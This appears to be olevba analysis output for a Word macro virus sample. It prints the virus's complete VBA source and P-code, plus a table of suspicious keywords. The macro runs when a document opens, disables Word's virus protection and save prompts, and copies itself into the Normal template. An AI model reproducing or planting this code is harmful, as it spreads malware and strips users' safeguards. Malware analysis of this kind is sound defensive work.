olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bptk.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bptk.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next 'D
Application.EnableCancelKey = 0
With Options:
.ConfirmConversions = 0
.SaveNormalPrompt = 0
.VirusProtection = 0
End With
t = "D"
If ActiveDocument.VBProject.VBComponents.Item(1).Codemodule.Lines(2, 1) <> "On Error Resume Next 'D" Then
Set d = ActiveDocument.VBProject.VBComponents.Item(1)
Set c = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.Lines(2, 1) <> "On Error Resume Next 'D" Then
Set d = NormalTemplate.VBProject.VBComponents.Item(1)
Set c = ActiveDocument.VBProject.VBComponents.Item(1)
Else: t = ""
End If
If t <> "" Then
d.Codemodule.DeleteLines 1, d.Codemodule.CountOfLines
d.Codemodule.AddFromString c.Codemodule.Lines(1, c.Codemodule.CountOfLines)
ActiveDocument.Save
NormalTemplate.Save
End If
Randomize
If Rnd < 0.3 Then MsgBox "ÁÏÒÊ"
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Bptk.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2322 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0001 "D"
' Line #2:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #3:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' Line #4:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #5:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #6:
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' Line #7:
' 	EndWith 
' Line #8:
' 	LitStr 0x0001 "D"
' 	St t 
' Line #9:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "On Error Resume Next 'D"
' 	Ne 
' 	IfBlock 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set d 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set c 
' Line #12:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "On Error Resume Next 'D"
' 	Ne 
' 	ElseIfBlock 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set d 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set c 
' Line #15:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St t 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld d 
' 	MemLd Codemodule 
' 	MemLd CountOfLines 
' 	Ld d 
' 	MemLd Codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld c 
' 	MemLd Codemodule 
' 	MemLd CountOfLines 
' 	Ld c 
' 	MemLd Codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld d 
' 	MemLd Codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #20:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #21:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	ArgsCall Read 0x0000 
' Line #24:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0004 "ÁÏÒÊ"
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #25:
' 	EndSub 
' Line #26:
' Line #27:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

